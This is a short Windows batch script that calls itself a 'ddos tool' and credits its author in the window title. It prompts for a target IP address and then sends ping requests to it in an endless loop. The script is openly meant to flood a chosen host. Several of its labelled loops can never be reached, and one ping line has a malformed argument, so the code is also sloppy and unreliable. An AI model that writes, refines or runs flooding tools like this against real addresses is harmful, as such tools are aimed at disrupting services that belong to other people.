@echo off
title ddos tool made with batch by -taha185
color 0a
echo Shout to you :]
timeout 1
cls
set /p ip="Enter target ip: "
:a
ping -n 1 -w 1 %ip%
goto a
:b
ping -n 1 -w 1 %ip%
goto b
:c
ping -n 1100-w 1 %ip%
goto c
:d
ping -n 100 -w 1 %ip%
goto d
